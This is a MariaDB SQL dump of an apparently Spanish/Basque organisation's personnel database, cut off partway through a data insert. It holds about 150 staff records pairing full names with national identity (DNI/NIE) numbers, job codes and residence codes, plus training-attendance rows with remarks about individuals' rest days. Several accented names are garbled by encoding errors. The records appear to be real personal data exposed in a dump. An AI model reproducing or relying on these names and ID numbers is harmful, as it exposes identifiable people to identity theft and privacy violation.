-- MySQL dump 10.19  Distrib 10.3.39-MariaDB, for Linux (x86_64)
--
-- Host: localhost    Database: personal
-- ------------------------------------------------------
-- Server version	10.3.39-MariaDB

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `agentes`
--

DROP TABLE IF EXISTS `agentes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `agentes` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `apellido1` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `apellido2` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `nombre` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `cargo_id` int(11) NOT NULL,
  `residencia_id` int(11) NOT NULL,
  `codigo_agente` int(11) NOT NULL,
  `status` int(11) NOT NULL DEFAULT 1,
  `dni` varchar(10) DEFAULT NULL,
  `estado_id` int(11) NOT NULL DEFAULT 1,
  `created` datetime DEFAULT NULL,
  `modified` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `numAgente` (`codigo_agente`),
  KEY `FK_Agentes_Residencias1` (`residencia_id`),
  KEY `FK_Agentes_Cargos` (`cargo_id`),
  KEY `codigo_agente` (`codigo_agente`),
  KEY `estado_id` (`estado_id`),
  CONSTRAINT `agentes_ibfk_1` FOREIGN KEY (`residencia_id`) REFERENCES `residencias` (`Id`),
  CONSTRAINT `agentes_ibfk_2` FOREIGN KEY (`cargo_id`) REFERENCES `cargos` (`Id`),
  CONSTRAINT `agentes_ibfk_3` FOREIGN KEY (`estado_id`) REFERENCES `estados` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=208 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `agentes`
--

LOCK TABLES `agentes` WRITE;
/*!40000 ALTER TABLE `agentes` DISABLE KEYS */;
INSERT INTO `agentes` VALUES (3,'AGUADO','EGURROLA','ESTELA',4,11,245,1,'15398258B',1,NULL,'2021-02-15 13:23:12'),(4,'BLAS','SEDANO','LUIS FERNANDO',1,2,78,2,'15929954Q',6,NULL,'2019-04-12 10:57:21'),(6,'IRASTORZA','EGURBIDE','MВӘ JESUS',4,2,291,1,'34105132L',1,NULL,'2018-01-08 12:42:01'),(7,'OYARZABAL','ZUGASTI','NEKANE',4,2,244,1,'35771933X',1,NULL,'2018-01-19 20:02:47'),(8,'PASCUAL','REY','MARIA IZASKUN',2,6,201,1,'34100877L',1,NULL,NULL),(9,'PEREZ','CALVO','AURORA',5,2,247,1,'15997289F',1,NULL,'2024-03-01 08:06:08'),(10,'RODRIGALVAREZ','URRUTICOECHEA','ESTIBALIZ',4,2,292,1,'44138374V',1,NULL,NULL),(11,'VEGAS','MARANTE','MARIA JOSE',2,2,200,1,'34097800R',1,NULL,NULL),(14,'GARCIA','OLASO','CRISTINA',2,3,198,1,'14599588Q',1,NULL,NULL),(15,'LLANO','CURIEL','JOSEBA',2,3,150,2,'14580277W',6,NULL,'2023-02-08 11:05:07'),(16,'RUBIO','JURADO','MIGUEL',2,3,81,1,'15370224Z',1,NULL,NULL),(21,'ALVAREZ','CID','MARIA MERCEDES',5,2,180,1,'30568614G',1,NULL,'2017-12-06 18:03:11'),(22,'ANSA','ETXEBERRIA','JESUS MARIA',5,2,102,2,'15929756W',6,NULL,'2021-06-07 11:30:10'),(23,'ASENSIO','VAQUERO','JOSE ANTONIO',4,2,66,2,'15924442R',6,NULL,'2018-07-30 05:38:27'),(24,'BASTIDA','LASTRA','MARIA IDOIA',4,2,207,1,'15968696A',1,NULL,'2017-11-28 08:48:58'),(25,'DIAZ','LUCIO','ANTONIO',4,2,159,2,'15978074C',6,NULL,'2025-01-14 11:53:04'),(27,'FERNANDEZ','SANTIAGO','LUIS FRANCISCO',5,2,88,2,'15933817S',6,NULL,'2021-02-15 13:21:48'),(29,'LANSORENA','MARCOS','ADORACION',5,2,190,1,'11927020W',1,NULL,'2021-09-06 05:35:19'),(32,'MIRANDA','IGUAL','MIGUEL ANGEL',5,2,192,1,'34085148E',1,NULL,NULL),(33,'ODRIOZOLA','PALMA','JOSE ANGEL',5,2,193,1,'15962622R',1,NULL,NULL),(34,'URANGA','LOPEZ','MARIA CRISTINA',4,2,197,1,'34103050F',1,NULL,NULL),(35,'VAZQUEZ','CASTRO','JOSE RAMON',5,2,140,2,'15938724T',6,NULL,'2021-11-30 07:56:00'),(36,'VIGARA','MARTIN','MARIA SUSANA',4,2,196,1,'44138913G',1,NULL,NULL),(37,'VIGUERA','MARZOL','FCO. JAVIER',4,2,126,2,'72431102P',1,NULL,'2020-01-10 18:08:39'),(39,'MONROY','ORTEGA','JUAN CARLOS',2,6,171,2,'15941938V',6,NULL,'2024-09-27 06:31:13'),(40,'ZUMALABE','MAKIRRIAIN','JUAN DOMINGO',2,6,129,2,'72431577T',6,NULL,'2021-02-15 13:22:27'),(42,'PEINADOR','CARRERA','CARLOS',4,2,239,1,'34105281F',1,NULL,'2018-01-15 12:26:24'),(44,'ARTIGAS','PECHARROMAN','MARIA ANGELES',4,2,241,2,'16028025S',6,NULL,'2024-04-18 06:56:43'),(45,'LEON','CENDOYA','JOSE LUIS',2,4,155,2,'15931620A',6,NULL,'2021-02-15 13:22:05'),(77,'URBIZU','RINCON','IГ‘IGO',8,2,356,2,'72487009W',7,NULL,'2021-02-15 13:28:24'),(78,'PAVON','ARRIZABALAGA','AITOR',8,2,355,2,'44330117D',1,NULL,'2018-08-16 18:49:33'),(79,'VELEZ','GARCIA','ASIER',5,11,367,1,'72401563R',1,NULL,'2021-09-07 14:59:41'),(80,'AIZPURUA','MUJIKA','EГ‘AUT',8,2,375,2,'44152834X',7,'2018-01-08 12:40:31','2021-02-15 13:29:08'),(81,'MAIZA','RECONDO','ROBERTO',8,2,381,2,'72478386G',7,'2018-01-08 12:44:55','2021-02-15 13:28:39'),(82,'URIARTE','CASTRESANA','AMAIA',8,11,385,2,'72317371N',7,'2018-01-08 12:45:29','2020-09-14 17:15:53'),(83,'BERNARDINO','TROYANO','JOSE LUIS',4,11,380,1,'22732375A',1,'2018-01-08 12:48:14','2021-06-07 11:35:49'),(84,'COBO','CABADA','LANDER',5,11,382,1,'79003688E',1,'2018-01-08 12:52:11','2021-06-07 11:33:31'),(85,'SANCHEZ','ONAINDIA','ALBERTO',4,11,371,1,'29031972S',1,'2018-01-08 12:53:39','2018-01-09 07:18:26'),(87,'MARCOS','BLANCO','JORGE',8,11,370,2,'14613655F',7,'2018-01-08 13:25:53','2021-06-07 11:28:30'),(88,'URBERUAGA','LIZARANZU','JON',8,11,358,2,'78931649L',7,'2018-01-08 13:26:43','2021-02-15 13:24:27'),(89,'AYESTA','REMENTERIA','DAVID',8,11,366,2,'78871195D',7,'2018-01-08 13:27:06','2021-06-07 11:33:09'),(90,'TORRONTEGUI','GOIKOECHEA','JOSU',4,11,363,1,'30677496G',1,'2018-01-08 13:27:40','2021-06-07 11:36:14'),(91,'FERNANDEZ ',' ZABALA','ROBERTO',4,11,136,2,'14942102Z',6,'2018-01-08 17:33:00','2021-06-07 11:31:59'),(92,'GONZALEZ ',' PEГ‘AS','MВӘ MERCEDES',4,11,167,1,'30634274E',1,'2018-01-08 17:33:00','2021-02-22 09:50:51'),(93,'JIMENEZ ',' GONZALEZ','JOSE ROBERTO',4,11,277,2,'14249338X',6,'2018-01-08 17:33:00','2022-11-10 13:41:15'),(94,'KAREAGA ',' QUECEDO','AINHOA',4,11,306,1,'30637256Z',1,'2018-01-08 17:33:00','2018-01-08 17:33:00'),(95,'LLONA ',' BARRENECHEA','AITOR ALEJANDRO',5,11,293,2,'30622164X',7,'2018-01-08 17:33:00','2024-04-18 06:57:57'),(96,'MALATSETXEBARRIA ',' OLAГ‘ETA','GONTZAL',4,11,89,2,'78863638L',6,'2018-01-08 17:33:00','2024-09-16 05:19:04'),(97,'PAREDES ',' MATIAS','PILAR',4,11,202,1,'30600861M',1,'2018-01-08 17:33:00','2018-01-08 17:33:00'),(98,'PASCUAL ',' GARCIA','ALBERTO',4,11,253,1,'30658495R',1,'2018-01-08 17:33:00','2018-01-08 17:33:00'),(99,'TORRES ',' CASTELLANOS','JORGE',5,11,276,1,'30643991X',1,'2018-01-08 17:33:00','2021-02-15 13:30:27'),(100,'URIBARRI ',' URIBARRI','RAFAEL',4,11,133,2,'14941402G',1,'2018-01-08 17:33:00','2020-01-10 18:09:26'),(101,'VAZQUEZ ',' RUIZ POVEDA','ANTONIO ENRIQUE',4,11,336,2,'22717140V',7,'2018-01-08 17:33:00','2021-06-07 11:35:10'),(113,'ARAS ',' BOCANEGRA','ALBERTO',5,11,189,2,'22733887C',1,'2018-01-08 17:33:00','2020-01-10 18:08:57'),(114,'ARECHAGA ',' DIEZ','FELIX MARIA',5,11,218,1,'29032199N',1,'2018-01-08 17:33:00','2018-01-08 17:33:00'),(115,'ARRIETA ',' ALDALUR','IDOIA',5,11,284,2,'15378052E',2,'2018-01-08 17:33:00','2024-09-16 05:19:43'),(117,'CARBALLIDO ',' FERNANDEZ','NURIA',5,11,191,2,'30626973N',7,'2018-01-08 17:33:00','2021-06-07 11:28:58'),(118,'RODRIGUEZ ',' ITURRIAGA','DAVID',5,11,178,1,'29030498J',1,'2018-01-08 17:33:00','2018-01-08 17:33:00'),(119,'ROMERO ',' GARCIA','AGUSTIN',5,11,73,2,'22710845R',6,'2018-01-08 17:33:00','2021-06-07 11:29:16'),(120,'ARECHAVALETA','ZAMALLOA','AINHOA',5,2,217,1,'14606022X',1,'2018-01-09 12:34:31','2021-02-15 13:30:46'),(121,'SAGREDO','GATO','VALENTINA',8,11,143,2,'30564199M',6,'2018-01-09 12:42:58','2024-01-26 08:16:25'),(122,'GERRIKABEITIA','APELLANIZ','ALEX',4,11,63,2,'24406462N',6,'2018-01-09 12:43:30','2022-03-14 13:00:01'),(123,'SANZ','FERNANDEZ','JESUS MARIA',2,11,234,1,'22721444C',1,'2018-01-09 12:44:12','2018-10-01 07:15:06'),(124,'ARCE','MACARRON','ELIAS',2,15,233,1,'24406691B',6,'2018-01-15 09:53:52','2023-08-21 07:20:27'),(125,'LOPEZ','ROGADO','FRANCISCO JAVIER',8,12,229,2,'14582048W',6,'2018-01-15 09:55:45','2022-11-10 13:41:01'),(126,'TAPIZ','URIARTE','ISMAEL',2,15,181,1,'30594699F',1,'2018-01-15 09:56:55','2018-01-15 09:56:55'),(127,'IBAГ‘EZ','GARCIA','MIREN',2,15,179,1,'72255535T',1,'2018-01-15 09:58:24','2018-01-15 09:58:24'),(128,'CARCEDO','DE MIGUEL','FEDERICO',2,14,228,2,'14951118Z',6,'2018-01-15 10:00:03','2022-11-10 13:40:42'),(130,'RUIZ','GARCIA','ROBERTO',2,14,287,1,'30643907H',1,'2018-01-15 10:18:56','2018-01-15 10:18:56'),(131,'AGIRRE','AURREKOETXEA','NAGORE',5,11,378,1,'16087469G',1,'2018-01-18 09:23:03','2022-05-18 15:34:16'),(132,'PRESTAMERO','BEZARES','RAMON',5,11,379,1,'16064584G',1,'2018-01-18 09:24:14','2021-09-06 05:40:22'),(133,'FERNANDEZ','MELCON','JUAN',6,14,225,2,'24401053P',6,'2018-01-22 08:04:52','2021-06-07 11:39:24'),(136,'MARTINEZ','BURUAGA','CARLOS',4,11,395,2,'72584710E',7,'2018-05-03 05:00:38','2024-09-16 05:20:04'),(137,'PAGOLA','ALVAREZ','ARITZ',5,2,393,1,'72487648C',1,'2018-05-03 05:01:18','2021-02-15 13:28:51'),(138,'SANZ','MARTINEZ','JON',5,11,394,1,'45665257E',1,'2018-05-03 05:01:53','2025-03-17 08:30:12'),(139,'APELLIDO 1','APELLIDO 2','NOMBRE',8,2,1000,2,'12345678',1,'2018-08-08 15:29:36','2020-01-10 18:10:38'),(140,'URQUIZA ','CALLEJA','EGOITZ',8,11,402,1,'29035254P',1,'2018-10-30 06:51:04','2018-10-30 06:51:04'),(141,'DE PAZ','DEL CAMPO','ALBERTO',8,11,403,2,'44975789W',7,'2018-10-30 07:35:12','2021-06-07 11:32:52'),(142,'MENCHERO','MERINO','RAUL',6,16,405,2,'16060574L',7,'2019-09-16 09:34:08','2021-06-07 11:39:06'),(143,'BILBAO','ONAINDIA','OLAIA',2,16,406,2,'16054433L',7,'2019-09-19 05:42:05','2021-06-07 11:39:52'),(144,'ZALDIVAR','GARCIA','JON',8,11,413,2,'30681645J',7,'2019-11-06 08:30:09','2024-09-16 05:20:24'),(145,'BILBAO','ALTONAGA','AITOR',2,15,417,1,'72317315W',1,'2019-12-03 05:45:54','2026-04-24 06:59:41'),(146,'SILVA','MARTIN','JUAN',4,11,418,1,'22748397V',1,'2019-12-03 05:46:38','2025-05-27 05:23:44'),(147,'SANCHO','CUEVAS','LUIS MIGUEL',8,11,407,1,'22732306A',1,'2020-02-06 07:57:33','2021-06-07 11:40:19'),(148,'LANDETA','LEXARTZA','IELTXU',4,11,421,1,'78919215M',1,'2020-07-09 06:24:54','2025-05-27 05:24:19'),(149,'GALARRETA','ORIO','JON',8,2,422,2,'78923410Z',7,'2020-07-09 06:26:00','2024-09-10 05:28:13'),(150,'AURREKOETXEA','ZURINAGA','ALEXANDER',8,11,423,1,'45665074T',1,'2020-07-09 06:27:04','2025-05-27 05:26:23'),(151,'GARTZIA','LERSUNDI','AITOR',5,11,424,1,'30640428N',1,'2020-07-09 06:27:57','2025-03-17 08:29:57'),(152,'JAUREGI','ERQUICIA','IBAN',2,17,425,2,'72524750T',7,'2020-07-09 06:29:19','2022-03-14 12:59:22'),(153,'LARRAZABAL','CALVO','JON',2,15,426,1,'30681645J',1,'2020-07-09 06:33:22','2020-07-09 06:33:22'),(154,'MADINABEITIA','BOLINAGA','MARKEL',5,2,428,1,'15392767V',1,'2020-08-03 13:50:15','2021-09-06 05:35:33'),(155,'ETXEITA','GANDIAGA','MIREN',4,11,429,1,'14254965W',1,'2020-08-03 13:50:57','2025-03-17 08:30:32'),(156,'DIEZ','RUIZ','IGOR',2,15,427,1,'45664564L',1,'2020-08-03 13:51:28','2021-06-07 11:40:48'),(157,'URIARTE','MUГ‘OZ','EIHAR',5,2,432,2,'45665621H',7,'2020-09-14 17:04:54','2024-04-18 06:57:21'),(158,'ARTABE','BADIOLA','JAIONE',2,15,431,1,'78909289S',2,'2020-09-14 17:06:24','2022-11-10 13:42:53'),(159,'MAEZTU','FRADUA','GORKA',2,16,435,1,'78893330H',1,'2020-10-16 08:42:43','2020-10-16 08:42:43'),(160,'UGALDE','VESGA','IRATXE',8,2,442,2,'45626139G',7,'2021-01-12 11:22:56','2021-06-07 11:38:35'),(161,'MARTINEZ','MARCOS','ANA ISABEL',4,2,443,1,'44125594W',1,'2021-02-23 07:23:17','2021-02-23 07:23:17'),(162,'GARRO','MICHELENA','KARMELE',5,2,450,1,'72482653Q',1,'2021-04-06 07:04:14','2025-03-12 07:34:54'),(163,'EL HADRI','BOUKOUH','SAMIR',5,2,451,1,'72499453A',1,'2021-04-06 07:05:56','2024-09-16 05:08:00'),(164,'EL HADRI','BOUKOUH','NABIL',2,17,449,1,'72499713X',1,'2021-05-26 05:09:30','2021-06-15 07:39:37'),(165,'MANTEROLA','ARRUTI','MIKEL',2,2,448,2,'22222222',7,'2021-05-26 05:11:34','2024-04-18 06:59:25'),(166,'ETXEGARAI','MATXAIN','HARITZ',2,16,457,2,'73046688E',1,'2021-07-01 06:43:07','2023-07-05 05:43:42'),(167,'CALAVERA','CONDE','ENEKO',8,2,456,1,'72540144F',1,'2021-07-01 06:44:14','2024-09-16 05:04:28'),(168,'NUГ‘EZ','ARANBURU','ALEXIS',5,2,455,1,'49575198D',1,'2021-07-01 06:45:15','2025-03-12 07:35:19'),(169,'LASA','CASTRILLEJO','AITOR',8,2,458,1,'72506337X',1,'2021-07-01 15:21:47','2024-09-16 05:01:35'),(170,'SANTOS','ALONSO','KARLOS',8,2,459,1,'72599410W',1,'2021-07-16 05:37:51','2025-05-27 05:24:40'),(171,'SANZ','GURRUTXAGA','ANDER',8,2,465,1,'73036188X',1,'2022-06-15 11:51:36','2025-05-27 05:24:53'),(172,'TOME','ECHEVERRIA','IBON',2,17,467,1,'72548277K',1,'2022-06-15 11:52:31','2022-06-15 11:52:45'),(173,'ILIE',' ','CRISTINA',8,15,464,1,'Y2405464T',1,'2022-06-15 11:56:06','2024-09-16 05:10:59'),(174,'SEGURA','GARCIA','OIHANE',8,15,469,1,'79136717L',1,'2022-06-15 11:57:04','2024-09-16 05:14:32'),(175,'SALGUERO ','TORRE','MIKEL GOTZON',2,15,369,1,'30612051V',1,'2023-04-21 06:42:50','2024-04-18 07:00:02'),(176,'GOLDARACENA','BIELA','HODEI',8,17,477,2,'72501942P',7,'2023-06-14 08:18:02','2024-09-16 05:18:39'),(177,'ACHIAGA ','COSTA','JULIO ANTONIO',2,15,475,1,'78909795S',1,'2023-07-18 06:38:28','2023-07-18 06:38:28'),(178,'AZKARATE','TELLETXEA','JOSU',8,11,476,1,'78929704Y',1,'2023-07-18 06:39:51','2025-05-27 05:25:07'),(179,'MOLINA','AYARZAGUENA','DANIEL',8,11,478,1,'78902443T',1,'2023-07-18 06:40:42','2025-05-27 05:25:20'),(180,'ISASTI','CASTILLO','AITOR',8,11,479,1,'72582733T',1,'2023-07-18 06:41:34','2025-05-27 05:25:31'),(181,'ORTUONDO','ZUAZNABAR','UNAI',4,2,482,1,'78946921L',1,'2023-11-16 07:45:48','2025-05-27 05:25:47'),(182,'BADIOLA','OZAMIZ','JON',8,2,483,1,'78917055F',1,'2023-11-16 07:46:34','2025-05-27 05:26:00'),(183,'BERAZA',' MARZOL','EVA MARIA',4,2,486,1,'34109785A',1,'2024-03-11 09:15:33','2025-05-27 05:22:38'),(184,'FULLAONDO',' OQUINA','IГ‘AKI',2,17,487,1,'16075070W',1,'2024-03-11 09:16:34','2024-03-11 09:16:34'),(185,'ATUCHA','DOMINGUEZ','ANDONI',4,2,485,1,'79115798F',1,'2024-03-11 09:17:31','2025-05-27 05:26:10'),(186,'URDIAIN','GARRASTATXU','URKO',2,17,491,1,'16080476A',1,'2024-05-08 09:33:13','2024-05-08 09:33:13'),(187,'FLORES','GONZALEZ','PEIO',4,2,489,1,'44563804Q',1,'2024-05-08 09:33:58','2025-05-27 05:22:14'),(188,'MATEOS','JIMENEZ','DAVID',2,17,492,1,'44161321X',1,'2024-05-08 09:35:14','2024-05-08 09:35:14'),(189,'IRIONDO','BASKARAN','AITOR',2,17,490,1,'15382486V',1,'2024-05-08 09:35:57','2024-05-08 09:35:57'),(190,'PETRIKORENA','ARBELAIZ','AITOR',8,2,499,1,'15256513S',1,'2025-02-18 10:05:37','2025-02-18 10:05:37'),(191,'KORTA','ARANBARRI','UNAI',8,2,505,1,'44174157N',1,'2025-08-01 05:51:53','2025-08-01 05:51:53'),(192,'MURIEL','FRIAS','MERCEDES LEONOR',2,17,506,1,'16049823D',1,'2025-09-30 11:34:44','2026-04-24 07:02:51'),(193,'MAGUNAZELAIA','ZUBURRUTI','GORKA',8,2,508,1,'30693735M',1,'2025-09-30 11:36:57','2025-09-30 11:36:57'),(194,'ORDOГ‘EZ','MATEOS','AINHOA',8,2,509,1,'72461237J',1,'2025-09-30 11:38:49','2025-09-30 11:38:49'),(195,'PLAGARO','CAPANAGA','LIHER',8,2,510,1,'72744072V',1,'2025-09-30 11:39:51','2025-09-30 11:39:51'),(196,'ARGANDOГ‘A','GUTIERREZ','XABIER',8,2,507,1,'30692837G',1,'2025-09-30 12:31:11','2025-09-30 12:31:11'),(197,'ANDUEZA','FERNANDEZ','MARIA',8,2,517,1,'72484644Y',1,'2026-01-23 09:13:26','2026-01-23 09:13:26'),(198,'FLORES','URIBE','GOIZALDE',8,2,514,1,'78882852M',1,'2026-01-23 09:14:13','2026-01-23 09:14:13'),(199,'ISASI','GUERRICAGOITIA','IKER',8,2,512,1,'16080813H',1,'2026-01-23 09:15:11','2026-01-23 09:15:11'),(200,'LARRACOECHEA','GUISASOLA','DAVID',8,2,516,1,'78929006K',1,'2026-01-23 09:16:03','2026-01-23 09:16:03'),(201,'LOPEZ','FELIPE','ASIER',8,2,515,1,'72525226Q',1,'2026-01-23 09:16:51','2026-01-23 09:16:51'),(202,'PICABEA','BUENAVIDA','MIREN ITXASO',8,2,513,1,'34095422S',1,'2026-01-23 09:20:16','2026-01-23 09:20:16'),(203,'TROITIГ‘O','BERASATEGI','HARRITOKIETA',8,2,518,1,'35768581Q',1,'2026-01-23 09:21:34','2026-01-23 09:21:34'),(204,'PERURENA','LICEAGA','JUAN MIGUEL',4,2,519,1,'72443147R',1,'2026-01-28 07:52:16','2026-01-28 07:52:16'),(205,'GARMENDIA','MURILLO','IГ‘AKI JON',2,17,523,1,'72464286A',1,'2026-03-30 10:41:38','2026-03-30 10:41:38'),(206,'LOITI','VITORIA','ELLANDE',2,17,524,1,'72508264M',1,'2026-03-30 10:43:19','2026-03-30 10:43:19'),(207,'BERGARA','ASTOBIZA','ZUHAITZ',2,15,522,1,'45662304J',1,'2026-03-30 10:46:46','2026-03-31 09:16:36');
/*!40000 ALTER TABLE `agentes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `agentes_formations`
--

DROP TABLE IF EXISTS `agentes_formations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `agentes_formations` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `formacione_id` int(11) NOT NULL,
  `codigo_agente` int(11) NOT NULL,
  `is_trabajado` tinyint(1) NOT NULL DEFAULT 1,
  `observacion` text DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `formacion_id` (`formacione_id`,`codigo_agente`),
  KEY `codigo_agente` (`codigo_agente`),
  CONSTRAINT `agentes_formations_ibfk_1` FOREIGN KEY (`formacione_id`) REFERENCES `formaciones` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `agentes_formations_ibfk_2` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=1443 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `agentes_formations`
--

LOCK TABLES `agentes_formations` WRITE;
/*!40000 ALTER TABLE `agentes_formations` DISABLE KEYS */;
INSERT INTO `agentes_formations` VALUES (48,27,196,1,''),(49,27,190,1,'CURSO REALIZADO EN FECHAS ANTERIORES'),(50,26,196,1,''),(51,26,292,1,''),(52,26,375,1,''),(53,27,375,1,''),(54,31,180,1,''),(55,31,190,1,''),(56,31,244,1,''),(57,31,241,1,''),(58,31,355,1,''),(59,30,88,1,''),(60,30,192,1,''),(61,30,207,1,''),(62,30,239,1,''),(63,30,197,1,''),(64,30,356,1,''),(65,30,196,1,''),(66,29,102,1,''),(67,29,193,1,''),(68,29,245,1,''),(69,29,291,1,''),(70,29,247,1,''),(71,28,140,1,''),(72,28,159,1,''),(73,28,292,1,''),(74,28,126,1,''),(75,28,371,1,''),(76,28,66,1,''),(77,30,370,1,''),(78,26,385,1,''),(79,26,381,1,''),(80,27,385,1,''),(81,27,381,1,''),(82,33,189,1,''),(83,33,218,1,''),(85,33,178,1,''),(86,33,73,1,''),(87,33,167,1,''),(88,33,277,1,''),(89,33,306,1,''),(90,33,133,1,''),(91,33,367,1,''),(92,32,284,1,''),(93,32,191,1,''),(94,32,136,1,''),(95,32,276,1,''),(96,32,336,0,''),(97,32,293,1,''),(98,32,366,1,''),(99,32,363,1,''),(100,29,217,1,''),(101,29,143,1,''),(102,29,234,1,''),(103,32,202,1,''),(104,32,63,1,''),(106,35,355,1,''),(108,36,375,1,''),(109,36,381,1,''),(110,35,378,1,''),(111,35,366,1,''),(112,35,380,1,''),(113,35,358,1,''),(114,36,379,1,''),(115,36,382,1,''),(116,36,370,1,''),(117,36,363,1,''),(118,36,367,1,''),(119,36,356,1,''),(120,37,276,1,''),(121,37,382,1,''),(158,43,355,1,''),(159,44,385,1,''),(160,45,385,1,''),(161,46,385,1,''),(163,48,370,1,''),(164,49,370,1,''),(169,40,247,1,''),(170,40,192,1,''),(171,35,385,1,''),(172,50,385,1,''),(177,51,375,1,''),(178,51,381,1,''),(179,51,207,1,''),(180,51,244,1,''),(181,51,192,1,''),(182,50,366,1,''),(184,50,370,1,''),(185,50,371,1,''),(186,50,378,1,''),(187,50,379,1,''),(188,50,380,1,''),(189,50,382,1,''),(192,40,241,1,'Debo dГӯa curso gestiГіn de estrГ©s 16/05'),(193,53,385,1,''),(194,52,385,1,''),(195,54,393,1,''),(196,55,393,1,''),(197,56,393,1,''),(198,57,284,0,''),(199,57,178,1,''),(200,57,276,1,''),(201,58,133,1,''),(202,58,189,1,''),(203,58,218,1,''),(205,58,191,1,''),(207,43,180,1,''),(208,59,395,1,''),(209,59,394,1,''),(211,57,133,1,''),(212,60,202,1,''),(213,60,217,1,''),(214,60,336,1,''),(215,60,363,1,''),(216,61,277,1,''),(217,61,306,1,''),(218,61,276,1,''),(219,61,382,1,''),(220,62,136,1,''),(221,62,167,1,''),(222,62,253,1,''),(223,62,371,1,''),(226,62,191,1,''),(240,43,201,0,'El dГӯa 26/09 acude en dГӯa de descanso'),(241,43,190,0,'DГӯa 26 acude en dГӯa de descanso.<br>\r\nSe devuelve el dГӯa 4/10/2018'),(244,43,375,1,'Cambiado por Roberto Maiza'),(246,68,393,1,''),(248,72,287,1,''),(249,72,233,1,''),(250,72,198,1,''),(251,72,247,1,''),(252,72,171,1,''),(253,71,181,1,''),(254,71,63,1,''),(255,71,228,1,''),(256,71,81,1,''),(257,71,155,1,''),(258,71,200,1,''),(259,70,234,1,''),(260,70,229,1,''),(261,70,150,1,''),(262,70,201,1,''),(263,70,129,1,''),(265,72,179,1,''),(266,78,190,1,''),(267,78,197,1,''),(268,78,367,1,''),(269,77,180,1,''),(270,77,244,1,''),(271,77,126,1,''),(272,76,370,1,''),(273,76,292,1,''),(274,76,196,1,''),(275,74,159,1,''),(276,74,291,1,''),(277,74,371,1,''),(278,79,356,1,''),(279,68,375,1,''),(280,68,207,1,''),(282,68,381,1,''),(284,69,394,1,''),(285,69,378,1,''),(287,69,380,1,''),(288,69,382,1,''),(290,69,395,0,''),(293,81,136,1,''),(294,81,293,1,''),(295,81,366,1,''),(296,81,229,1,''),(297,69,402,1,''),(298,69,403,1,''),(299,82,140,1,''),(300,82,180,1,''),(301,82,200,1,''),(303,82,201,1,''),(305,83,393,1,''),(306,84,244,1,''),(307,84,393,1,''),(308,83,245,1,''),(309,85,217,1,''),(310,85,167,1,''),(313,85,253,1,''),(314,85,358,1,''),(315,85,367,1,''),(317,86,336,1,''),(320,86,382,1,''),(321,86,229,1,''),(322,86,370,1,''),(324,85,136,1,''),(325,85,366,1,''),(326,87,380,1,''),(327,87,306,1,''),(328,87,202,1,''),(329,87,363,1,''),(330,87,394,1,''),(331,86,378,1,''),(332,86,371,0,''),(333,85,293,1,''),(334,86,191,1,''),(335,86,189,1,''),(336,85,133,1,''),(338,86,276,1,''),(339,86,218,1,''),(344,83,394,1,''),(345,83,402,1,''),(346,83,403,1,''),(347,83,336,1,''),(348,83,293,1,''),(349,84,394,1,''),(350,84,402,1,''),(351,84,403,1,''),(352,84,395,1,''),(353,83,253,1,''),(354,83,306,1,''),(355,85,178,1,''),(357,85,284,1,''),(373,95,245,1,''),(375,95,239,1,''),(376,95,207,1,''),(377,95,126,1,''),(379,95,193,1,''),(380,95,140,1,''),(382,90,356,1,''),(383,90,159,1,''),(384,90,244,1,''),(385,90,197,1,''),(386,90,247,1,''),(387,90,292,1,''),(390,95,247,1,''),(395,97,378,1,''),(396,97,245,1,''),(398,97,180,1,''),(399,97,102,1,''),(400,97,1000,1,''),(401,97,189,1,''),(402,97,233,1,''),(403,97,218,1,''),(404,97,217,1,''),(405,97,284,1,''),(406,97,241,1,''),(408,97,366,1,''),(410,97,207,1,''),(411,97,380,1,''),(412,97,191,1,''),(413,97,228,1,''),(414,97,382,1,''),(415,97,159,1,''),(416,97,225,1,''),(417,97,88,1,''),(418,97,136,1,''),(419,97,198,1,''),(420,97,63,1,''),(421,97,167,1,''),(422,97,179,1,''),(423,97,291,1,''),(424,97,277,1,''),(425,97,306,1,''),(426,97,155,1,''),(427,97,150,1,''),(428,97,293,1,''),(429,97,229,1,''),(430,97,89,1,''),(431,97,370,1,''),(432,97,192,1,''),(433,97,171,1,''),(434,97,193,1,''),(436,97,202,1,''),(437,97,253,1,''),(438,97,201,1,''),(439,97,239,1,''),(440,97,247,1,''),(441,97,379,1,''),(442,97,292,1,''),(443,97,178,1,''),(4